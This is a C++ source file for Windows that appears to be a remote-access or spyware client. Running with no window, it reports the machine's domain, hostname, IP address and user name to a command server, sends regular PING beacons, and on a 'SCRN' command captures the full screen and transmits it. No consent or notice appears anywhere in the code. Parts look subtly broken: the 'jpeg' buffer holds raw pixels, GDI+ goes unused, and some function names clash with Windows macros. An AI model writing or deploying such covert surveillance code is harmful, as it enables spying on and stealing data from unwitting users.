#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <thread>
#include <iostream>
#include <vector>
#include <iphlpapi.h>
#include <lm.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

using namespace Gdiplus;

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 12345;
bool running = true;

std::string GetComputerName() {
    char buffer[256]{};
    DWORD size = sizeof(buffer);
    ::GetComputerNameA(buffer, &size);
    return buffer;
}

std::string GetUserName() {
    char buffer[256]{};
    DWORD size = sizeof(buffer);
    ::GetUserNameA(buffer, &size);
    return buffer;
}

std::string GetDomainName() {
    LPWSTR domain = nullptr;
    NETSETUP_JOIN_STATUS status;
    if (NetGetJoinInformation(nullptr, &domain, &status) == NERR_Success && status == NetSetupDomainName) {
        std::wstring ws(domain);
        NetApiBufferFree(domain);
        return std::string(ws.begin(), ws.end());
    }
    return "WORKGROUP";
}

std::string GetLocalIP() {
    PIP_ADAPTER_INFO adapterInfo;
    ULONG bufferSize = 0;
    
    if (GetAdaptersInfo(nullptr, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (PIP_ADAPTER_INFO)malloc(bufferSize);
        if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
            for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != nullptr; adapter = adapter->Next) {
                if (adapter->IpAddressList.IpAddress.String[0] != '0') {
                    std::string ip = adapter->IpAddressList.IpAddress.String;
                    free(adapterInfo);
                    return ip;
                }
            }
        }
        free(adapterInfo);
    }
    return "127.0.0.1";
}

bool TakeScreenshot(std::vector<BYTE>& jpegData) {
    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    BITMAPINFOHEADER bi = { sizeof(bi), width, height, 1, 24, BI_RGB };
    jpegData.resize(width * height * 3);
    GetDIBits(hdcScreen, hBitmap, 0, height, jpegData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    return true;
}

void SendScreenshot(SOCKET sock) {
    std::vector<BYTE> imageData;
    if (TakeScreenshot(imageData)) {
        char header[8];
        memcpy(header, "SCRN", 4);
        *(int*)(header + 4) = imageData.size();
        send(sock, header, 8, 0);
        send(sock, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
    }
}

void KeepAliveLoop(SOCKET sock) {
    while (running) {
        send(sock, "PING", 4, 0);
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}

void MessageHandler(SOCKET sock) {
    char buffer[4096];
    while (running) {
        int bytes = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes <= 0) {
            running = false;
            break;
        }
        
        if (bytes >= 4 && strncmp(buffer, "SCRN", 4) == 0) {
            SendScreenshot(sock);
        }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        return 1;
    }

    std::string clientInfo = GetDomainName() + "|" + GetComputerName() + "|" + 
                           GetLocalIP() + "|" + GetUserName();
    send(sock, clientInfo.c_str(), clientInfo.size() + 1, 0);

    std::thread keepAlive(KeepAliveLoop, sock);
    std::thread handler(MessageHandler, sock);
    keepAlive.detach();
    handler.detach();

    MSG msg;
    while (running && GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running = false;
    closesocket(sock);
    WSACleanup();
    GdiplusShutdown(gdiplusToken);
    return 0;
}
